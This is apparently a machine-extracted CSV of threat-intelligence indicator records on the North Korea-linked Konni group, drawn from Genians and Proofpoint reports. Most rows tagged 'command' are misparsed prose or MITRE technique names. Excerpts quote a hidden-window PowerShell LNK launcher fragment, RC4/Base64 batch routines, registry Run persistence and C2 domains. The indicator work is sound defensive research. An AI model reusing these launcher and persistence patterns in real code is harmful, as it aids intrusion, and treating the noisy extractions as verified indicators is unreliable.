schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--konni,artifact--sha256:e34a86d9a4131e715011bd535232fa06f5c22b9db62366fb8b463f11557d512e,observation--sha256:a281f8b81d947946f4b820353bde8e45416f3bd12f6777a1553ca7afbe1a2b98,command,/c powershell -windowstyle hidden,/c powershell -windowstyle hidden,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 36 04. 유사도 분석 (Similarity) a. APT37 LNK 공격과 Konni LNK 공격 구조비교 ○ 2023 년 상반기 발견된 APT37 과 Konni 캠페인의 LNK 악성 코드를 비교하면 서로 다른 패턴을 가지고 있음을 알 수 있습니다. Konni 경우 Base64 인코딩을 사용합니다. APT37 LNK (MD5 : 1b046ab2261bc0dc5c6cd999f9a8b1c6) Konni LNK (MD5 : 0db38e75740572fed8179d67c33019cb) /c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath = '%temp%'}; $lnkpath = Get-ChildItem -Pa,
1.0.0,actor--konni,artifact--sha256:68630314c32bafe8dfd8856e61b56f7116a919772ac6b99da95bcdfd9db3af27,observation--sha256:67fa37010973ae60ae3ac5550e93d9d24caefcd72e228f57d655ab1636071c8c,command,/c powershell -windowstyle hidden $dirPath,/c powershell -windowstyle hidden $dirPath,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 36 04. 유사도 분석 (Similarity) a. APT37 LNK 공격과 Konni LNK 공격 구조비교 ○ 2023 년 상반기 발견된 APT37 과 Konni 캠페인의 LNK 악성 코드를 비교하면 서로 다른 패턴을 가지고 있음을 알 수 있습니다. Konni 경우 Base64 인코딩을 사용합니다. APT37 LNK (MD5 : 1b046ab2261bc0dc5c6cd999f9a8b1c6) Konni LNK (MD5 : 0db38e75740572fed8179d67c33019cb) /c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath = '%temp%'}; $lnkpath = Get-ChildItem -Pa,
1.0.0,actor--konni,artifact--sha256:970de12b279e2dd2a071f5fa9a1cda945c6ac36d014c6b1d183ec944c329367d,observation--sha256:23a7bc19b28ec2138ffbb12798c8098d487008d7d2bb9b3001fd19e324b1e726,command,07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로,07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:bffa2b8653b8d3a095bf6d0808363ae6d9d7601fc5c647709fa0cb1cea2061ad,observation--sha256:5cfeb5ba3e4bc6ffcc5086edff3b6b08434e22e05fc669ebbe306f57941c4d75,command,19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로,19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:a1bc3f46381427a2fb39e9c5165f3e694d7305ec4d60d8f7086774a7dae135c6,observation--sha256:188463791d187c2132dac7e7922f4ed25461ee06d19365fe68c8991b077c05fc,command,7 PowerShell – Convert Ticks to DateTime and Vise Versa,7 PowerShell – Convert Ticks to DateTime and Vise Versa,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 19 b. fd - Base64+RC4 로 인코딩된 데이터 c. r - RC4 Key 값 [Powershell (Get-Date).ticks]7 73888454.bat - ‘30966118.bat’ 파일 존재 시 : a. 레지스트리 Run 에 ‘svchostno2’ 이름으로 ‘start.vbs’ 등록 b. ‘30966118.bat’ 실행 후 이후 명령에서 삭제 c. ‘32981202.bat’ 실행 - ‘30966118.bat’, ‘upok.txt’ 파일 없을 시 : a. ‘32981202.bat’ 실행 - ‘pakistan.txt’ 파일 없을 시 : a. ‘temprun.bat’ 파일 존재시 삭제 b. ‘19288086.bat’ 파일 루틴을 통해 C2(overseeby[.]com)에서 감염 컴퓨터명 경로 파일을 ‘IxOkj.cab’ 다운로드 후 압축 해제하고 삭제 c. 압축 해제 된 파일 ‘t",
1.0.0,actor--konni,artifact--sha256:c6b088ce9d0b4e2b51b072cacc16d9b4163e2eec4ae149d5aaf9c77369abc6e4,observation--sha256:d6478ce0b2f3c145940d9c0d27e84fbbf758b222bae95dd0a0802199f8a8ab34,command,CommandandScriptingInterpreter:PowerShell,CommandandScriptingInterpreter:PowerShell,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 47}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport 8. 공격지표(Indicator of Attack)8.1. MITREATT&CKMatrix - MITREATT&CK Matrix- Konni GroupDescriptions 9 10 Tactic Technique Description Reconnaissance T1598.002 Phishingfor Information:SpearphishingAttachment T1598.003 Phishingfor Information:SpearphishingLink ResourceDevelopment T1585.002 EstablishAccounts:Email Accounts T1585.003 EstablishAccounts:CloudAccounts Initial Access T1566.002 Phishing:SpearphishingLink T1566.003 Phishing:SpearphishingviaService Execution T1059.00,
1.0.0,actor--konni,artifact--sha256:d0d272566c0995c69e52edc6e8e04682108f6653332bdf8d571668dca8935b3a,observation--sha256:2747cb2abaf5d3b2c095d8f9a0fa04fcb792eb386631de9d80a502d14b49e62d,command,"Firefox), and numerous PowerShell scripts (keylogging, exfiltration of emails and more). Based on Proofpoint’s visibility,","Firefox), and numerous PowerShell scripts (keylogging, exfiltration of emails and more). Based on Proofpoint’s visibility",candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TA427 TA427 may be best known for its use of browser extensions ( STOLEN PENCIL) and HTA-based malware ( BabyShark). TA427 uses credential harvesting, spear-phishing campaigns, infrastructure-scanning tools, and various tools and exploits leaked by the hacker group, The Shadow Brokers . As recently as October 2021, TA427 was still using BabyShark, QuasarRAT, PCRat, browser extensions (Chrome, Edge and Firefox), and numerous PowerShell scripts (keylogging, exfiltration of emails and more). Based ",
1.0.0,actor--konni,artifact--sha256:d1c269dc9168217ffefa32aee60398c767d6fba5f67144929e186c4d184e13c6,observation--sha256:f4e27f9c4c953ae028ccb07661bd5cc94389080f290ecfc5979e9896ae193f20,command,MSHTA to download unknown HTA malware.,MSHTA to download unknown HTA malware,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TA427 TA427 may be best known for its use of browser extensions ( STOLEN PENCIL) and HTA-based malware ( BabyShark). TA427 uses credential harvesting, spear-phishing campaigns, infrastructure-scanning tools, and various tools and exploits leaked by the hacker group, The Shadow Brokers . As recently as October 2021, TA427 was still using BabyShark, QuasarRAT, PCRat, browser extensions (Chrome, Edge and Firefox), and numerous PowerShell scripts (keylogging, exfiltration of emails and more). Based ",
1.0.0,actor--konni,artifact--sha256:7f0617b53e63383a46c3929afdeb741f4e7264f89756c816e36b17f729182822,observation--sha256:9d26d2e40faec3110ee45111e7df2add8410f0a08de63437fdc83d0e000417b8,command,T1059.001 Command and Scripting Interpreter: PowerShell,T1059.001 Command and Scripting Interpreter: PowerShell,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 45}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 44 07. 공격 지표 (Indicator of Attack) a. MITRE ATT&CK11 Matrix - Konni12 Group Descriptions Tactic Technique Description Reconnaissance T1598.002 Phishing for Information: Spearphishing Attachment Initial Access T1566.001 Phishing: Spearphishing Attachment Execution T1059.001 Command and Scripting Interpreter: PowerShell T1059.003 Command and Scripting Interpreter: Windows Command Shell T1059.005 Command and Scripting Interpreter: Visual Basic T120,
1.0.0,actor--konni,artifact--sha256:b687a613d3cc8ba8984cf14ff50a9188de5fe2fcb5a3daa9dfd83730012008b9,observation--sha256:eef52874af594ae1d94b64f7a6d8c7f82865cd336fa85de65de142080e98c80a,command,VBS 스크립트와 BAT 파일 등을 Powershell 명령어로 풀어 호출하는 과정을 거치게 됩니다.,VBS 스크립트와 BAT 파일 등을 Powershell 명령어로 풀어 호출하는 과정을 거치게 됩니다,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 5 d. 공격 전술 및 기술, 절차 (TTPs) & 킬 스위치 ○ 공격자는 다양한 실전 경험을 통해 효과적인 위협 시나리오를 기획하고, 거점용 C2(명령제어) 서버를 구축해 본격적인 공격을 준비합니다. 그리고 공격 대상자를 선정 후 현혹될 만한 주제의 내용과 악성 파일을 개발해 스피어 피싱 공격을 수행했습니다. ○ LNK 바로가기 타입의 공격은 국내에서 다수 보고되고 있습니다. 특히, APT37 그룹은 자동화된 악성코드 제작도구까지 도입해 활용하는 등 나름 적극적으로 사용 중인데, 코니 그룹이 사용한 코드와는 기술적으로 일부 상이한 구조를 보입니다. ○ APT37 그룹과 다르게 코니 그룹이 사용한 LNK 파일은 포맷 내부에 16 진수 스트링 데이터를 블럭화해 Powershell 명령을 수행합니다. 미끼로 보여줄 정상 (문서) 파일 후위에 악성 ZIP 또는 CAB 압축 포맷이 연이어 내장돼 있는",
